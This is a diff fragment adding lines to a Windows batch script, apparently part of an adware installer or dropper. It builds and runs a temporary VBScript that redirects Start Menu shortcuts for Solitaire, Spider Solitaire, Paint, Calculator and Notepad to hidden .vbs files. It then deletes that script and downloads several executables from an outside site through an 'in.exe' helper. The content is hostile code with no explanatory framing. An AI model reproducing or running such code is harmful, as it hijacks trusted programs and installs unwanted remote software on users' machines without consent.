+echo Set Shortcut=WshShell.CreateShortCut("C:\Documents and Settings\All Users\「开始」菜单\程序\游戏\纸牌.lnk" ) >>"lnk.vbs"
+echo Shortcut.TargetPath=path >>"lnk.vbs"
+echo Shortcut.Save>>"lnk.vbs"
+echo path="d:\Program Files\Common Files\Service\zhizhuzhipai.vbs">>"lnk.vbs"
+echo Set Shortcut=WshShell.CreateShortCut("C:\Documents and Settings\All Users\「开始」菜单\程序\游戏\蜘蛛纸牌.lnk" ) >>"lnk.vbs"
+echo Shortcut.TargetPath=path >>"lnk.vbs"
+echo Shortcut.Save>>"lnk.vbs"
+echo path="D:\Program Files\Common Files\Service\mpaint.vbs">>"lnk.vbs"
+echo Set Shortcut=WshShell.CreateShortCut("C:\Documents and Settings\All Users\「开始」菜单\程序\附件\画图.lnk" ) >>"lnk.vbs"
+echo Shortcut.TargetPath=path >>"lnk.vbs"
+echo Shortcut.Save>>"lnk.vbs"
+echo path="D:\Program Files\Common Files\Service\aclc.vbs">>"lnk.vbs"
+echo Set Shortcut=WshShell.CreateShortCut("C:\Documents and Settings\All Users\「开始」菜单\程序\附件\计算器.lnk" ) >>"lnk.vbs"
+echo Shortcut.TargetPath=path >>"lnk.vbs"
+echo Shortcut.Save>>"lnk.vbs"
+echo path="D:\Program Files\Common Files\Service\notepa.vbs">>"lnk.vbs"
+echo Set Shortcut=WshShell.CreateShortCut("C:\Documents and Settings\All Users\「开始」菜单\程序\附件\记事本.lnk" ) >>"lnk.vbs"
+echo Shortcut.TargetPath=path >>"lnk.vbs"
+echo Shortcut.Save>>"lnk.vbs"
+"%SystemRoot%\System32\WScript.exe" lnk.vbs
+del lnk.vbs
+
+"%MYFILES%\in.exe" "http://a.xwxiazai.com/soft/setup.exe"
+"%MYFILES%\in.exe" "http://a.xwxiazai.com/soft/YoudaoDict_zhusha_quantui_001.exe"
+"%MYFILES%\in.exe" "http://a.xwxiazai.com/soft/36a.exe"
+"%MYFILES%\in.exe" "http://a.xwxiazai.com/soft/nsetup.exe"
